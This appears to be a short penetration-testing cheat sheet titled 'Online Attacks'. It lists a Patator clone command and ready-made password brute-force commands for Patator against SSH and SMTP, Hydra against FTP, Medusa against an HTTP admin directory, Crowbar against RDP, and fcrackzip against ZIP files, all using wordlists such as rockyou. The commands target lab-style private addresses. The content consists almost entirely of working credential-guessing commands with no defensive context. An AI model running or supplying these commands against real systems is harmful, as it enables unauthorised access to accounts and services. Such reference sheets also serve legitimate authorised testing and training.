# ⭕ Online Attacks

## Patator

```
git clone https://github.com/lanjelot/patator.git 
```

```
patator ssh_login host=192.168.56.103 user=FILE0 0=user  password=/usr/share/wordlists/rockyou.txt

patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
    
patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    
patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    
patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
```

## Hydra

```
hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst -u -e s -s 25 192.168.0.15 ftp
```

## Medusa

```
medusa -h 192.168.1.2 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

## Crobar

```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```

## fcrackzip

```
fcrackzip -u -D -p wordlist.txt file.zip
```

